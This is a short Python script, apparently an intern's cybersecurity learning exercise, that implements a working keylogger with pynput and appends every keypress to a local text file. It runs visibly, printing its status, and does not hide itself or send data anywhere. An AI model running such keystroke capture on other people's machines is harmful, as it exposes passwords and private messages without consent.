from pynput.keyboard import Listener
import os

# Specifying the absolute path for the keylog file
log_file_path = "/Users/nurdin/CyberSecurityIntern/keylog.txt"

# Ensuring the file is created if it doesn't exist
if not os.path.exists(log_file_path):
    with open(log_file_path, "w") as log_file:
        log_file.write("Keylogger started...\n")

def log_keystroke(key):
    """Log each keypress to a file."""
    try:
        # Formating the key
        key = str(key).replace("'", "")
        if key == 'Key.space':
            key = ' '
        elif key == 'Key.enter':
            key = '\n'
        elif key.startswith('Key'):
            key = f'[{key}]'

        # Appending the key to the file
        with open(log_file_path, "a") as log_file:
            log_file.write(key)
    except Exception as e:
        print(f"Error logging key: {e}")

if __name__ == "__main__":
    try:
        print(f"Keylogger saving to: {log_file_path}")
        print("Keylogger is running... Press Ctrl+C to stop.")
        # Start listening for keystrokes
        with Listener(on_press=log_keystroke) as listener:
            listener.join()
    except Exception as e:
        print(f"Error starting keylogger: {e}")
